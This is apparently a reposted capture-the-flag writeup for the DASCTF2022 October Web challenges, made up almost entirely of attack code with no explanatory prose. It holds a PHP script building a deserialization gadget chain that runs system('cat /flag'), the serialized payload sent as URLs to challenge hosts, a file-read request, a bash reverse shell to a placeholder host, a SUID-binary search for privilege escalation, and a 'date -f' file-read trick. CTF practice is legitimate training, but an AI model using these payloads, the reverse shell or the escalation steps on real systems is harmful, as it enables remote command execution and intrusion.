# DASCTF2022 ——十月赛 Web 部分Writeup

> 原文: https://www.ctfiot.com/67573.html
> ID: 67573


```
<?php

class fine
{
 public $cmd;
 public $content;
}

class show
{
 public $ctf;
 public $time;
}

class sorry
{
 public $name;
 public $password;
 public $hint;
 public $key;
}

class secret_code
{
 public $code;
}

$e = new fine();
$e->cmd = 'system';
$e->content = 'cat /flag';

$d = new sorry();
$d->key = $e;

$c = new secret_code();
$c->code = $d;

$b = new Show();
$b->ctf = $c;

$a = new sorry();
$a->name = '123';
$a->password = '123';
$a->hint = $b;

echo serialize($a);
http://f9eac3ed-9425-4fe7-a009-aad41f9db212.node4.buuoj.cn:81/?pop=O:5:"sorry":4:{s:4:"name";s:3:"123";s:8:"password";s:3:"123";s:4:"hint";O:4:"show":2:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";N;s:3:"key";O:4:"fine":3:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat /flag";}}}s:4:"time";N;}s:3:"key";N;}
http://f9eac3ed-9425-4fe7-a009-aad41f9db212.node4.buuoj.cn:81/?pop=O:5:"sorry":4:{s:4:"name";s:3:"123";s:8:"password";s:3:"123";s:4:"hint";O:4:"show":2:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";N;s:3:"key";O:4:"fine":3:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat /flag";}}}s:4:"time";N;}s:3:"key";N;}
http://745b93ee-b378-4803-b84e-52f9e7b78d2a.node4.buuoj.cn:81/file.php?m=show&filename=file.php
bash -i >& /dev/tcp/xxxx/yyyy 0>&1
find / -perm -u=s -type f 2>/dev/null
date -f /hereisflag/flllll111aaagg
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1666940438.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/9-1666940438.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/0-1666940439.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1666940440.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/4-1666940441.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1666940441.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1666940442.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1666940443.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/1-1666940445.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1666940446.png)